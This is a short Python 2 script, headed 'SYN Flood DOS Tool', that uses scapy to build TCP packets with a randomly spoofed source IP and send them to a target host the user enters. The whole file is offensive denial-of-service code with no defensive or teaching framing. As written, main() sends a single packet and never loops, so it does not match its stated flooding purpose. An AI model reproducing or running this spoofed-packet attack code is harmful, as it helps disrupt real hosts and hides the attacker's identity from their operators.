# Davis Dinh
# SYN Flood DOS Tool

from scapy.all import *
import sys
import os
import random

def sourceSpoof():
	octet = []
	spoofIP = str(random.randint(1,254))
	for i in range(0,3):
		octet.append(random.randint(1,254)) #Try to avoid 0.0.0.0 and 255.255.255.255	
		spoofIP = spoofIP + "." + str(octet[i])
	
	return spoofIP

def construct(targetIP, srcIP):
	packet_h = IP()
	packet_h.dst = targetIP
	packet_h.src = srcIP

	tcp_h = TCP()
	tcp_h.sport = random.randint(1000,10000)
	tcp_h.dport = random.randint(1000,10000)

	packet = packet_h/tcp_h
	return packet

def send_packet(packet):
	send(packet)

def main():
	targetIP = raw_input("Target Host: ")
	srcIP =	sourceSpoof()
	packet = construct(targetIP, srcIP)
	send_packet(packet)

main()
